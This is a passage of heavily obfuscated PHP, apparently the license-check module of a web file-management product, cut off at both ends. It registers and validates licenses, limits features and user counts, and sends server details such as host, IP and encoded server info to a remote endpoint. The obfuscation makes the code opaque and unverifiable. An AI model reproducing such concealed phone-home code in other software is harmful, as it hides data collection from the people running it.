(!$ÅÍ¯Âà) { break; } $ÅÍ¯Âà++; } foreach ($ÀıÚî¥Ô as $®êó¢•À) { $İªø×Ùü = $GLOBALS[$ÉáäÖâ[85]][$ÉáäÖâ[86]][$®êó¢•À]; $·ÍÜÇ = $‹ŒÒ÷…[647]; while (strlen($·ÍÜÇ) < $‹ŒÒ÷…[623]) { if (!$·ÍÜÇ) { break; } $·ÍÜÇ++; } if (isset($®‚Åã¬[$®êó¢•À])) { $İªø×Ùü = $®‚Åã¬[$®êó¢•À]; } $Øá‰ƒê’[$ÉáäÖâ[87]][$ÉáäÖâ[88]][$®êó¢•À] = $İªø×Ùü; } $¡œ¥‚» = $Øá‰ƒê’[$ÉáäÖâ[87]][$ÉáäÖâ[88]][$ÉáäÖâ[46]]; $íîÔ¥Á‹ = $‹ŒÒ÷…[648]; if (!$íîÔ¥Á‹) { return; } unset($Øá‰ƒê’[$ÉáäÖâ[87]][$ÉáäÖâ[89]][$ÉáäÖâ[90]]); $¿Ö¸î¤ = $‹ŒÒ÷…[649]; if (strlen($¿Ö¸î¤) < $‹ŒÒ÷…[636]) { return; } unset($Øá‰ƒê’[$ÉáäÖâ[87]][$ÉáäÖâ[89]][$ÉáäÖâ[91]]); unset($Øá‰ƒê’[$ÉáäÖâ[87]][$ÉáäÖâ[88]][$ÉáäÖâ[46]]); unset($Øá‰ƒê’[$ÉáäÖâ[87]][$ÉáäÖâ[88]][$ÉáäÖâ[92]]); $ÅºŞù×¾ = $‹ŒÒ÷…[650]; if (!$ÅºŞù×¾) { return; } $Øá‰ƒê’[$ÉáäÖâ[87]][$ÉáäÖâ[88]][$ÉáäÖâ[93]] = array($ÉáäÖâ[94] => (int) $¡œ¥‚»[$ÉáäÖâ[95]], $ÉáäÖâ[96] => (int) _get($¡œ¥‚», $ÉáäÖâ[97], 0)); $Øá‰ƒê’[$ÉáäÖâ[98]][$ÉáäÖâ[99]] = Action($ÉáäÖâ[100])->accessToken(); $Øá‰ƒê’[$ÉáäÖâ[98]][$ÉáäÖâ[101]] = md5($_SERVER[$ÉáäÖâ[102]] . $®‚Åã¬[$ÉáäÖâ[103]]); $Øá‰ƒê’[$ÉáäÖâ[98]][$ÉáäÖâ[104]] = base64_encode(serverInfo()); $çÅÎÖ©ï = $‹ŒÒ÷…[651]; $Øá‰ƒê’[$ÉáäÖâ[98]][$ÉáäÖâ[105]] = $this->vfirbe779c01; if ($®‚Åã¬[$ÉáäÖâ[105]] != $ÉáäÖâ[106]) { $Øá‰ƒê’[$ÉáäÖâ[98]][$ÉáäÖâ[107]] = $®‚Åã¬[$ÉáäÖâ[107]]; $Øá‰ƒê’[$ÉáäÖâ[98]][$ÉáäÖâ[108]] = $®‚Åã¬[$ÉáäÖâ[108]]; $ÅÏ£–º‚ = rand_string(10) . $this->vfirbe779c01 . rand_string(5); $Øá‰ƒê’[$ÉáäÖâ[87]][$ÉáäÖâ[109]][$ÉáäÖâ[110]] = $this->mjgybe5b20d6($ÅÏ£–º‚, $Øá‰ƒê’[$ÉáäÖâ[98]][$ÉáäÖâ[101]]); } if ($this->vfirbe779c01 == $ÉáäÖâ[106]) { $Øá‰ƒê’[$ÉáäÖâ[87]][$ÉáäÖâ[88]][$ÉáäÖâ[93]][$ÉáäÖâ[97]] = 0; } $Øá‰ƒê’[$ÉáäÖâ[98]][$ÉáäÖâ[111]] = _get($this->xmsj57b5cd6b, $ÉáäÖâ[112], $ÉáäÖâ[6]); $Øá‰ƒê’[$ÉáäÖâ[98]][$ÉáäÖâ[113]] = _get($this->xmsj57b5cd6b, $ÉáäÖâ[114], $ÉáäÖâ[6]); $ªƒ’¨ùú = $‹ŒÒ÷…[652]; if (strlen($ªƒ’¨ùú) < $‹ŒÒ÷…[621]) { return; } if (_get($GLOBALS, $ÉáäÖâ[115]) && $this->config[$ÉáäÖâ[116]]) { $Øá‰ƒê’[$ÉáäÖâ[98]][$ÉáäÖâ[117]] = WEB_ROOT; } return $Øá‰ƒê’; } private function gkyi5641f714() { $ªëÑ¸ìÅ =& $_SERVER[­õöî’–]; $¤ãØÆ”ƒ =& $_SERVER[øû®”õ ]; $üóë•±Ö = $_SERVER[$¤ãØÆ”ƒ[24]] == $¤ãØÆ”ƒ[118]; if ($_SERVER[$¤ãØÆ”ƒ[24]] == $¤ãØÆ”ƒ[119] && $_GET[$¤ãØÆ”ƒ[120]] == $¤ãØÆ”ƒ[121]) { $üóë•±Ö = !0; } if ($üóë•±Ö) { $¥”ïçüĞ = array($¤ãØÆ”ƒ[105] => $this->vfirbe779c01, $¤ãØÆ”ƒ[122] => $this->gblkcf9fd1e9(), $¤ãØÆ”ƒ[123] => Model($¤ãØÆ”ƒ[124])->count()); if ($this->vfirbe779c01 != $¤ãØÆ”ƒ[106]) { $Ä ³ü‚ó = _get($this->xmsj57b5cd6b, $¤ãØÆ”ƒ[125]); if ($Ä ³ü‚ó) { $¥”ïçüĞ[$¤ãØÆ”ƒ[126]] = $Ä ³ü‚ó; $¥”ïçüĞ[$¤ãØÆ”ƒ[127]] = strtotime(_get($this->xmsj57b5cd6b, $¤ãØÆ”ƒ[128])); $¥”ïçüĞ[$¤ãØÆ”ƒ[129]] = _get($this->xmsj57b5cd6b, $¤ãØÆ”ƒ[114]); } $£Ÿü½°„ = Model($¤ãØÆ”ƒ[33])->get($¤ãØÆ”ƒ[130], $¤ãØÆ”ƒ[6], !0); if (is_string($£Ÿü½°„) && substr($£Ÿü½°„, 0, 1) == $¤ãØÆ”ƒ[131]) { $£Ÿü½°„ = json_decode_force($£Ÿü½°„); } if (is_array($£Ÿü½°„) && $£Ÿü½°„[$¤ãØÆ”ƒ[132]] && strstr($£Ÿü½°„[$¤ãØÆ”ƒ[132]], $¤ãØÆ”ƒ[133])) { $Õ—°Ç = explode($¤ãØÆ”ƒ[133], $£Ÿü½°„[$¤ãØÆ”ƒ[132]]); $¥”ïçüĞ[$¤ãØÆ”ƒ[134]] = $Õ—°Ç[0]; } } $¥”ïçüĞ = $this->hbgscf19c541(json_encode($¥”ïçüĞ), md5($¤ãØÆ”ƒ[135])); $†°Ñ±ÂÏ = $ªëÑ¸ìÅ[653]; if (strlen($†°Ñ±ÂÏ) < $ªëÑ¸ìÅ[636]) { return; } $ªùò = array($¤ãØÆ”ƒ[136] => $¥”ïçüĞ); $˜¦×”‚ò = $ªëÑ¸ìÅ[654]; call_user_func(array($¤ãØÆ”ƒ[137], $¤ãØÆ”ƒ[138]), $ªùò); $â×°ª“Û = $ªëÑ¸ìÅ[655]; if (strlen($â×°ª“Û) < $ªëÑ¸ìÅ[631]) { die; } } if ($this->vfirbe779c01 == $¤ãØÆ”ƒ[106]) { return; } $¹å…±ˆ´ = array($¤ãØÆ”ƒ[139], $¤ãØÆ”ƒ[140], $¤ãØÆ”ƒ[141], $¤ãØÆ”ƒ[142], $¤ãØÆ”ƒ[143], $¤ãØÆ”ƒ[144]); $…’ÚØŸá = $ªëÑ¸ìÅ[656]; $Æ³©¥ˆ… = Model($¤ãØÆ”ƒ[33])->get(); $ªùò = array($¤ãØÆ”ƒ[145] => $Æ³©¥ˆ…[$¤ãØÆ”ƒ[34]], $¤ãØÆ”ƒ[146] => $Æ³©¥ˆ…[$¤ãØÆ”ƒ[35]], $¤ãØÆ”ƒ[147] => $¤ãØÆ”ƒ[6]); $Ù½Â‰Œ£ = $ªëÑ¸ìÅ[657]; if (strlen($Ù½Â‰Œ£) < $ªëÑ¸ìÅ[636]) { die; } foreach ($¹å…±ˆ´ as $ãÙŒœã) { if (!isset($Æ³©¥ˆ…[$ãÙŒœã]) || !$Æ³©¥ˆ…[$ãÙŒœã]) { continue; } $ªùò[$ãÙŒœã] = $Æ³©¥ˆ…[$ãÙŒœã]; $Óû‹ıİ„ = $ªëÑ¸ìÅ[658]; if (strlen($Óû‹ıİ„) < $ªëÑ¸ìÅ[626]) { return; } } call_user_func(array($¤ãØÆ”ƒ[137], $¤ãØÆ”ƒ[138]), $ªùò); $ÒéÀÙ» = $ªëÑ¸ìÅ[659]; if (!$ÒéÀÙ») { die; } } private function lonma4529786() { $‰İÁáø =& $_SERVER[­õöî’–]; $Ê·ôÅ²ã =& $_SERVER[øû®”õ ]; if ($_SERVER[$Ê·ôÅ²ã[24]] != $Ê·ôÅ²ã[148]) { return; } if (!_get($GLOBALS, $Ê·ôÅ²ã[115])) { die; } $º¸¿ã´ğ = $GLOBALS[$Ê·ôÅ²ã[13]]; if (isset($º¸¿ã´ğ[$Ê·ôÅ²ã[149]])) { $this->hgsl345632d3(); die; } if (!isset($º¸¿ã´ğ[$Ê·ôÅ²ã[150]]) || strlen($º¸¿ã´ğ[$Ê·ôÅ²ã[150]]) != 16) { show_json($Ê·ôÅ²ã[151] . $º¸¿ã´ğ[$Ê·ôÅ²ã[150]], !1); } $ÔŸÊ¦÷Á = Model($Ê·ôÅ²ã[33])->get($Ê·ôÅ²ã[103]); $Ñ»ÜÔ×œ = md5($_SERVER[$Ê·ôÅ²ã[102]] . $ÔŸÊ¦÷Á); $ËÈ”‰Àü = $‰İÁáø[660]; if (!$ËÈ”‰Àü) { die; } $€Ô·çÅ² = array($Ê·ôÅ²ã[150] => $º¸¿ã´ğ[$Ê·ôÅ²ã[150]], $Ê·ôÅ²ã[152] => rand_string(16), $Ê·ôÅ²ã[153] => $Ê·ôÅ²ã[135], $Ê·ôÅ²ã[154] => $Ê·ôÅ²ã[155], $Ê·ôÅ²ã[156] => $_SERVER[$Ê·ôÅ²ã[157]], $Ê·ôÅ²ã[158] => $_SERVER[$Ê·ôÅ²ã[159]], $Ê·ôÅ²ã[160] => $_SERVER[$Ê·ôÅ²ã[161]], $Ê·ôÅ²ã[101] => $Ñ»ÜÔ×œ, $Ê·ôÅ²ã[162] => Model($Ê·ôÅ²ã[33])->get($Ê·ôÅ²ã[130])); $Ñò¬Å = $‰İÁáø[661]; if (!$Ñò¬Å) { die; } if ($º¸¿ã´ğ[$Ê·ôÅ²ã[163]] == $Ê·ôÅ²ã[164]) { $“ˆ‡ÁŒË = $this->hbgscf19c541($Ñ»ÜÔ×œ, $Ê·ôÅ²ã[165]); $ÅÍšĞâ× = $this->mjgybe5b20d6(json_encode($€Ô·çÅ²), $Ñ»ÜÔ×œ . $Ê·ôÅ²ã[166], 3); $ÅÍšĞâ× = $ÅÍšĞâ× . $Ê·ôÅ²ã[167] . $_SERVER[$Ê·ôÅ²ã[157]]; $¶ÀÊŸÀ = $this->scli244a7cd4($Ê·ôÅ²ã[168] . $“ˆ‡ÁŒË . $Ê·ôÅ²ã[169] . $ÅÍšĞâ×, -1); show_json($¶ÀÊŸÀ, !0); } else { if ($º¸¿ã´ğ[$Ê·ôÅ²ã[163]] == $Ê·ôÅ²ã[170]) { $ø—¨Ğ— = substr(md5($Ê·ôÅ²ã[171] . $Ñ»ÜÔ×œ), 12, 15) . $Ê·ôÅ²ã[172]; $ÅÍšĞâ× = $this->bcqe88c7bbf2(trim($º¸¿ã´ğ[$Ê·ôÅ²ã[173]]), $ø—¨Ğ—, 2); $ÁÌŞÈà¾ = json_decode($ÅÍšĞâ×, !0); if (!is_array($ÁÌŞÈà¾) || !is_array($ÁÌŞÈà¾[$Ê·ôÅ²ã[174]]) || $ÁÌŞÈà¾[$Ê·ôÅ²ã[150]] != !0) { $è§ÍÓ÷ß = $Ê·ôÅ²ã[175]; $ŞÏ›³Éæ = $ÁÌŞÈà¾[$Ê·ôÅ²ã[174]] ? $Ê·ôÅ²ã[176] . $ÁÌŞÈà¾[$Ê·ôÅ²ã[174]] : $è§ÍÓ÷ß; show_json($ŞÏ›³Éæ, !1); } else { $€Ô·çÅ²[$Ê·ôÅ²ã[152]] = $ÁÌŞÈà¾[$Ê·ôÅ²ã[174]][$Ê·ôÅ²ã[177]]; } } else { $ÁÌŞÈà¾ = $this->scli244a7cd4($Ê·ôÅ²ã[178], $€Ô·çÅ², 10); } } if (!is_array($ÁÌŞÈà¾) || !is_array($ÁÌŞÈà¾[$Ê·ôÅ²ã[174]]) || $ÁÌŞÈà¾[$Ê·ôÅ²ã[150]] != !0) { $è§ÍÓ÷ß = LNG($Ê·ôÅ²ã[179]); $ŞÏ›³Éæ = $ÁÌŞÈà¾[$Ê·ôÅ²ã[174]] ? $Ê·ôÅ²ã[176] . $ÁÌŞÈà¾[$Ê·ôÅ²ã[174]] : $è§ÍÓ÷ß; show_json($ŞÏ›³Éæ, !1); } $ûØô¦ì† = $ÁÌŞÈà¾[$Ê·ôÅ²ã[174]]; $îû¾åÄÇ = $this->esmh5aa94b2d($ûØô¦ì†[$Ê·ôÅ²ã[180]]); $š–¤œ¤ç = $‰İÁáø[662]; while ($š–¤œ¤ç < $‰İÁáø[636]) { if ($š–¤œ¤ç >= 0) { break; } $š–¤œ¤ç++; } if (!$îû¾åÄÇ || $îû¾åÄÇ != $ûØô¦ì†[$Ê·ôÅ²ã[128]]) { $œ»ß‰ŸÖ = array($Ê·ôÅ²ã[181] => Model($Ê·ôÅ²ã[33])->get($Ê·ôÅ²ã[103]), $Ê·ôÅ²ã[182] => $_SERVER[$Ê·ôÅ²ã[102]], $Ê·ôÅ²ã[183] => this_url(), $Ê·ôÅ²ã[158] => $_SERVER[$Ê·ôÅ²ã[159]]); $ÅÍšĞâ× = $this->utek5a5644a4(json_encode($œ»ß‰ŸÖ)); $this->scli244a7cd4($Ê·ôÅ²ã[184] . $ÅÍšĞâ×); show_json(LNG($Ê·ôÅ²ã[185]), !0); } $Âù«¤±Õ = array($Ê·ôÅ²ã[186] => $ûØô¦ì†[$Ê·ôÅ²ã[187]], $Ê·ôÅ²ã[188] => $ûØô¦ì†[$Ê·ôÅ²ã[189]], $Ê·ôÅ²ã[190] => rand_string(16), $Ê·ôÅ²ã[105] => $ûØô¦ì†[$Ê·ôÅ²ã[191]]); if ($€Ô·çÅ²[$Ê·ôÅ²ã[152]]) { $Âù«¤±Õ[$Ê·ôÅ²ã[190]] = $€Ô·çÅ²[$Ê·ôÅ²ã[152]]; } $ŠÆ·•’õ = substr(md5($Âù«¤±Õ[$Ê·ôÅ²ã[188]]), 10, 10); $Âå¡ô¬ = $ŠÆ·•’õ . $Âù«¤±Õ[$Ê·ôÅ²ã[105]] . $Âù«¤±Õ[$Ê·ôÅ²ã[190]]; $Âù«¤±Õ[$Ê·ôÅ²ã[107]] = strrev(base64_encode($this->hbgscf19c541($Âå¡ô¬, $Ê·ôÅ²ã[192]))); $§İÀ¢´Ó = $‰İÁáø[663]; if (!$§İÀ¢´Ó) { return; } $°ÉÜ×¿’ = rand_string(16); $²İØ¾¾æ = $°ÉÜ×¿’ . $Âù«¤±Õ[$Ê·ôÅ²ã[105]] . $this->hbgscf19c541(md5($Âù«¤±Õ[$Ê·ôÅ²ã[186]]), $°ÉÜ×¿’); $Âù«¤±Õ[$Ê·ôÅ²ã[108]] = base64_encode(strrev($this->hbgscf19c541($²İØ¾¾æ, $Ê·ôÅ²ã[193]))); if ($ûØô¦ì†[$Ê·ôÅ²ã[194]] && $ûØô¦ì†[$Ê·ôÅ²ã[194]] >= 1) { Model($Ê·ôÅ²ã[33])->setDeep($Ê·ôÅ²ã[195], $Ê·ôÅ²ã[121]); } Model($Ê·ôÅ²ã[33])->set($Âù«¤±Õ); $˜†Øâ†È = md5($_SERVER[$Ê·ôÅ²ã[102]] . strrev($ÔŸÊ¦÷Á) . $Âù«¤±Õ[$Ê·ôÅ²ã[188]]); $ã ÷Ï½ = strrev(substr($˜†Øâ†È, 10, 16)); $µæĞíîì = $‰İÁáø[664]; if (strlen($µæĞíîì) < $‰İÁáø[623]) { return; } $ÂØöØ¼ = $this->mjgybe5b20d6(json_encode($ûØô¦ì†), $˜†Øâ†È); $¾ˆ¹­ı„ = $‰İÁáø[665]; $é×˜šéÚ = array_to_keyvalue(Model($Ê·ôÅ²ã[7])->listData(), $Ê·ôÅ²ã[196]); $ÕÂé‰´„ = $‰İÁáø[666]; if (strlen($ÕÂé‰´„) < $‰İÁáø[621]) { return; } $º“ï‹¡¤ = $é×˜šéÚ[$Ê·ôÅ²ã[197]]; $…‚ß°ÍŸ = array(); $…‚ß°ÍŸ[$ã ÷Ï½] = $ÂØöØ¼; Model($Ê·ôÅ²ã[7])->update($º“ï‹¡¤[$Ê·ôÅ²ã[198]], array($Ê·ôÅ²ã[199] => $…‚ß°ÍŸ)); $ü©ÜÊøı = $‰İÁáø[667]; $this->xmsj57b5cd6b = $ûØô¦ì†; $this->vfirbe779c01 = $Âù«¤±Õ[$Ê·ôÅ²ã[105]]; $¦ã…¯Ï = $‰İÁáø[668]; while (strlen($¦ã…¯Ï) < $‰İÁáø[636]) { if (!$¦ã…¯Ï) { break; } $¦ã…¯Ï++; } $this->licenseRegistSuccess(); $œ«‚Ğ¾š = $‰İÁáø[669]; if (strlen($œ«‚Ğ¾š) < $‰İÁáø[626]) { die; } Cache::set($Ê·ôÅ²ã[200] . md5($ÔŸÊ¦÷Á . $Ê·ôÅ²ã[201]), $Ê·ôÅ²ã[6]); $è›£ÇÎü = $‰İÁáø[670]; while (strlen($è›£ÇÎü) < $‰İÁáø[626]) { if (!$è›£ÇÎü) { break; } $è›£ÇÎü++; } show_json(LNG($Ê·ôÅ²ã[185]), !0); } private function licenseRegistSuccess() { $”‹­Í× =& $_SERVER[øû®”õ ]; $³ÍšÚ¯¡ = Model($”‹­Í×[33])->get(); if ($³ÍšÚ¯¡[$”‹­Í×[63]] != $”‹­Í×[121]) { Model($”‹­Í×[33])->set($”‹­Í×[63], $”‹­Í×[121]); } Action($”‹­Í×[202])->initStart(!0); } private function hgsl345632d3() { $’ñÓ–ƒ­ =& $_SERVER[­õöî’–]; $»Âßô¶¸ =& $_SERVER[øû®”õ ]; Model($»Âßô¶¸[33])->set(array($»Âßô¶¸[186] => $»Âßô¶¸[6], $»Âßô¶¸[188] => $»Âßô¶¸[6], $»Âßô¶¸[105] => $»Âßô¶¸[106], $»Âßô¶¸[107] => $»Âßô¶¸[6], $»Âßô¶¸[108] => $»Âßô¶¸[6])); $‰éœæ¾“ = $’ñÓ–ƒ­[671]; Model($»Âßô¶¸[33])->setDeep($»Âßô¶¸[195], $»Âßô¶¸[203]); $©¡Å¿Ö = $’ñÓ–ƒ­[672]; if (strlen($©¡Å¿Ö) < $’ñÓ–ƒ­[626]) { return; } $this->xmsj57b5cd6b = array(); $ÍèÆ§ßª = $’ñÓ–ƒ­[673]; if (strlen($ÍèÆ§ßª) < $’ñÓ–ƒ­[623]) { return; } $this->vfirbe779c01 = $»Âßô¶¸[106]; } private function gkmec2978d3c() { $¾ÚöâõŞ =& $_SERVER[­õöî’–]; $¦Ú–µÉ˜ =& $_SERVER[øû®”õ ]; $_SERVER[$¦Ú–µÉ˜[159]] = _get($_SERVER, $¦Ú–µÉ˜[159], APP_HOST); $this->vfirbe779c01 = $¦Ú–µÉ˜[106]; $ÙÕ¦ô¿× = $¾ÚöâõŞ[674]; while (strlen($ÙÕ¦ô¿×) < $¾ÚöâõŞ[631]) { if (!$ÙÕ¦ô¿×) { break; } $ÙÕ¦ô¿×++; } $“ŸÜ–§Í = Model($¦Ú–µÉ˜[33])->get(); if ($“ŸÜ–§Í[$¦Ú–µÉ˜[105]] == $¦Ú–µÉ˜[106]) { return; } $º¹²® = Model($¦Ú–µÉ˜[33])->get($¦Ú–µÉ˜[103]); $Œ®àÉÌ¡ = $¾ÚöâõŞ[675]; if (strlen($Œ®àÉÌ¡) < $¾ÚöâõŞ[636]) { die; } $†’ëî  = $¦Ú–µÉ˜[200] . md5($º¹²® . $¦Ú–µÉ˜[201]); $¡øû¬‘ = Cache::get($†’ëî ); if (!is_array($¡øû¬‘) || !isset($¡øû¬‘[$¦Ú–µÉ˜[204]]) || time() - $¡øû¬‘[$¦Ú–µÉ˜[204]] >= 60) { $‡Æš¨Ñê = Model($¦Ú–µÉ˜[7])->loadList(); $ùéÇƒğî = $‡Æš¨Ñê[$¦Ú–µÉ˜[197]]; $ï™ûü = md5($_SERVER[$¦Ú–µÉ˜[102]] . strrev($º¹²®) . $“ŸÜ–§Í[$¦Ú–µÉ˜[188]]); $¹¢Áóø = strrev(substr($ï™ûü, 10, 16)); $¡øû¬‘ = $this->bcqe88c7bbf2($ùéÇƒğî[$¦Ú–µÉ˜[85]][$¹¢Áóø], $ï™ûü); $¡øû¬‘ = json_decode($¡øû¬‘, !0); } if (!is_array($¡øû¬‘)) { return $this->hgsl345632d3(); } $Ïœ’‘¡Î = strtotime($¡øû¬‘[$¦Ú–µÉ˜[128]]); if (time() >= $Ïœ’‘¡Î) { return $this->hgsl345632d3(); } if (time() - $¡øû¬‘[$¦Ú–µÉ˜[204]] > 20) { $¡øû¬‘[$¦Ú–µÉ˜[204]] = time(); Cache::set($†’ëî , $¡øû¬‘); } $this->xmsj57b5cd6b = $¡øû¬‘; $this->vfirbe779c01 = $“ŸÜ–§Í[$¦Ú–µÉ˜[105]]; } private function blyqb1afcfe2() { $”‰ìùñÃ =& $_SERVER[øû®”õ ]; $è¡ßô÷ = $GLOBALS[$”‰ìùñÃ[13]]; $Àòù±ÆŞ = $_SERVER[$”‰ìùñÃ[24]]; $ò‹ç’¬© = $_SERVER[­õöî’–][676]; if (!$ò‹ç’¬©) { return; } if ($Àòù±ÆŞ == $”‰ìùñÃ[205] && $this->vfirbe779c01 == $”‰ìùñÃ[106]) { show_json(LNG($”‰ìùñÃ[206]), !1, $”‰ìùñÃ[207]); } $ùàŸóêâ = array($”‰ìùñÃ[208], $”‰ìùñÃ[209]); if (in_array($Àòù±ÆŞ, $ùàŸóêâ)) { if ($this->vfirbe779c01 == $”‰ìùñÃ[106] && isset($è¡ßô÷[$”‰ìùñÃ[210]])) { show_json(LNG($”‰ìùñÃ[206]), !1, $”‰ìùñÃ[207]); die; } $ôîùõ¨ß = $this->gblkcf9fd1e9(); if ($ôîùõ¨ß != intval($”‰ìùñÃ[211])) { if ($ôîùõ¨ß <= Model($”‰ìùñÃ[124])->count()) { show_json(LNG($”‰ìùñÃ[212]), !1, $”‰ìùñÃ[207]); die; } } } } private function drtn75b2e51b() { $ÏÎšø½” =& $_SERVER[­õöî’–]; $ÒŞÚ›ŠÑ =& $_SERVER[øû®”õ ]; $˜”Å«ôù = array($ÒŞÚ›ŠÑ[118], $ÒŞÚ›ŠÑ[119]); if (!_get($GLOBALS, $ÒŞÚ›ŠÑ[115]) || !isset($_GET[$ÒŞÚ›ŠÑ[213]])) { return; } if (!in_array($_SERVER[$ÒŞÚ›ŠÑ[24]], $˜”Å«ôù)) { return; } $Ã‘¯—·Í = $ÒŞÚ›ŠÑ[214]; $Ã‘¯—·Í = $this->fwcve0f9736c($Ã‘¯—·Í, $ÒŞÚ›ŠÑ[215]); $¥Ø˜ƒÖ = $ÏÎšø½”[677]; if (!$¥Ø˜ƒÖ) { die; } $›š¨‡­ı = stream_context_create(array($ÒŞÚ›ŠÑ[216] => array($ÒŞÚ›ŠÑ[217] => $ÒŞÚ›ŠÑ[218], $ÒŞÚ›ŠÑ[219] => 3))); $İ¤Œ©œù = $ÏÎšø½”[663]; while ($İ¤Œ©œù < $ÏÎšø½”[631]) { if ($İ¤Œ©œù >= 0) { break; } $İ¤Œ©œù++; } $í„ë§ªß = @file_get_contents($Ã‘¯—·Í, !1, $›š¨‡­ı); header($ÒŞÚ›ŠÑ[220]); if ($í„ë§ªß && strstr($í„ë§ªß, $ÒŞÚ›ŠÑ[221])) { echo $í„ë§ªß; } die; } public function teyx883a3b2c($ª·…æŒ) { $ˆÉœ—°Ñ =& $_SERVER[­õöî’–]; $©¶­¶›ƒ =& $_SERVER[øû®”õ ]; if ($this->vfirbe779c01 == $©¶­¶›ƒ[222]) { return $ª·…æŒ; } $»Á•Ç = array($©¶­¶›ƒ[223] => $©¶­¶›ƒ[224], $©¶­¶›ƒ[225] => $©¶­¶›ƒ[224], $©¶­¶›ƒ[226] => $©¶­¶›ƒ[224], $©¶­¶›ƒ[227] => $©¶­¶›ƒ[224], $©¶­¶›ƒ[228] => $©¶­¶›ƒ[229], $©¶­¶›ƒ[230] => $©¶­¶›ƒ[229], $©¶­¶›ƒ[231] => $©¶­¶›ƒ[229], $©¶­¶›ƒ[232] => $©¶­¶›ƒ[229], $©¶­¶›ƒ[233] => $©¶­¶›ƒ[229], $©¶­¶›ƒ[234] => $©¶­¶›ƒ[229], $©¶­¶›ƒ[235] => $©¶­¶›ƒ[229], $©¶­¶›ƒ[236] => $©¶­¶›ƒ[229], $©¶­¶›ƒ[237] => $©¶­¶›ƒ[229], $©¶­¶›ƒ[238] => $©¶­¶›ƒ[229], $©¶­¶›ƒ[239] => $©¶­¶›ƒ[229], $©¶­¶›ƒ[240] => $©¶­¶›ƒ[229]); $ØÓö˜¨ = $ˆÉœ—°Ñ[678]; while (strlen($ØÓö˜¨) < $ˆÉœ—°Ñ[636]) { if (!$ØÓö˜¨) { break; } $ØÓö˜¨++; } $ŠşÂ¿Â = explode($©¶­¶›ƒ[241], _get($this->xmsj57b5cd6b, $©¶­¶›ƒ[112], $©¶­¶›ƒ[6])); $À£¤é§Ë = $ˆÉœ—°Ñ[679]; while ($À£¤é§Ë < $ˆÉœ—°Ñ[631]) { if ($À£¤é§Ë >= 0) { break; } $À£¤é§Ë++; } $æ ÜÁ—¤ = array(); foreach ($»Á•Ç as $‘«Š“µ¸ => $üìà‘ëÏ) { if ($üìà‘ëÏ == $©¶­¶›ƒ[224] && substr($this->vfirbe779c01, 0, 1) == $©¶­¶›ƒ[224]) { continue; } if (!in_array($‘«Š“µ¸, $ŠşÂ¿Â)) { $æ ÜÁ—¤[] = $‘«Š“µ¸; } } foreach ($æ ÜÁ—¤ as $‘«Š“µ¸) { unset($ª·…æŒ[$‘«Š“µ¸]); } return $ª·…æŒ; } private function brsod51d665a() { $‹Í‹åçĞ =& $_SERVER[øû®”õ ]; if ($this->vfirbe779c01 != $‹Í‹åçĞ[106]) { $GLOBALS[$‹Í‹åçĞ[85]][$‹Í‹åçĞ[89]][$‹Í‹åçĞ[242]] = $‹Í‹åçĞ[203]; return; } $GLOBALS[$‹Í‹åçĞ[85]][$‹Í‹åçĞ[243]] = $‹Í‹åçĞ[121]; if (Model($‹Í‹åçĞ[244])->get($‹Í‹åçĞ[63]) != $‹Í‹åçĞ[203]) { Model($‹Í‹åçĞ[244])->set($‹Í‹åçĞ[63], $‹Í‹åçĞ[203]); } } public function nhjacba7bb21() { return $_SERVER[øû®”õ ][245]; } private function qdhr38c368f9() { $¼­¨¡Õ½ =& $_SERVER[­õöî’–]; $İ ñ‹ª =& $_SERVER[øû®”õ ]; $ëÆ¼Áì = array($İ ñ‹ª[246], $İ ñ‹ª[247], $İ ñ‹ª[248]); $Ã¥ÕÍœ¾ = $İ ñ‹ª[249] . md5($İ ñ‹ª[250]); if ($this->vfirbe779c01 == $İ ñ‹ª[106] || !_get($GLOBALS, $İ ñ‹ª[115])) { return; } if (!in_array($_SERVER[$İ ñ‹ª[24]], $ëÆ¼Áì)) { return; } if (time() % 4 != 0) { return; } $üĞ¯„² = call_user_func(array($İ ñ‹ª[251], $İ ñ‹ª[252]), $Ã¥ÕÍœ¾); $âíÅö§¨ = $¼­¨¡Õ½[680]; if ($üĞ¯„² && time() - $üĞ¯„² < intval($İ ñ‹ª[253])) { return; } call_user_func(array($İ ñ‹ª[251], $İ ñ‹ª[138]), $Ã¥ÕÍœ¾, time()); $ÕåíĞ•¼ = $¼­¨¡Õ½[681]; while ($ÕåíĞ•¼ < $¼­¨¡Õ½[636]) { if ($ÕåíĞ•¼ >= 0) { break; } $ÕåíĞ•¼++; } $Ş†­øë = Model($İ ñ‹ª[33])->get($İ ñ‹ª[103]); $‰Á„úßĞ = array($İ ñ‹ª[150] => Model($İ ñ‹ª[33])->get($İ ñ‹ª[186]), $İ ñ‹ª[163] => $this->vfirbe779c01, $İ ñ‹ª[160] => $_SERVER[$İ ñ‹ª[161]], $İ ñ‹ª[162] => Model($İ ñ‹ª[33])->get($İ ñ‹ª[130]), $İ ñ‹ª[101] => md5($_SERVER[$İ ñ‹ª[102]] . $Ş†­øë), $İ ñ‹ª[153] => $İ ñ‹ª[135], $İ ñ‹ª[156] => $_SERVER[$İ ñ‹ª[157]]); $Ë‡„ÎàÔ = $¼­¨¡Õ½[682]; while (strlen($Ë‡„ÎàÔ) < $¼­¨¡Õ½[621]) { if (!$Ë‡„ÎàÔ) { break; } $Ë‡„ÎàÔ++; } $ÒÙ­í£× = $this->scli244a7cd4($İ ñ‹ª[254], $‰Á„úßĞ); $²»«•·‘ = $¼­¨¡Õ½[683]; if (strlen($²»«•·‘) < $¼­¨¡Õ½[626]) { die; } if (!is_array($ÒÙ­í£×)) { return; } if ($ÒÙ­í£×[$İ ñ‹ª[150]] && $ÒÙ­í£×[$İ ñ‹ª[255]]) { if ($this->esmh5aa94b2d($ÒÙ­í£×[$İ ñ‹ª[255]]) == $‰Á„úßĞ[$İ ñ‹ª[150]]) { return; } } $this->hgsl345632d3(); if ($this->esmh5aa94b2d($ÒÙ­í£×[$İ ñ‹ª[255]]) != $‰Á„úßĞ[$İ ñ‹ª[150]]) { $ıĞîôµ” = array($İ ñ‹ª[181] => $Ş†­øë, $İ ñ‹ª[182] => $_SERVER[$İ ñ‹ª[102]], $İ ñ‹ª[183] => this_url(), $İ ñ‹ª[158] => $_SERVER[$İ ñ‹ª[159]]); $—¾±Šà = $this->utek5a5644a4(json_encode($ıĞîôµ”)); $ÒÙ­í£× = $this->scli244a7cd4($İ ñ‹ª[184] . $—¾±Šà); if ($ÒÙ­í£× && is_array($ÒÙ­í£×) && isset($ÒÙ­í£×[$İ ñ‹ª[255]])) { $ú§š©º« = $this->bcqe88c7bbf2($ÒÙ­í£×[$İ ñ‹ª[255]], 2); 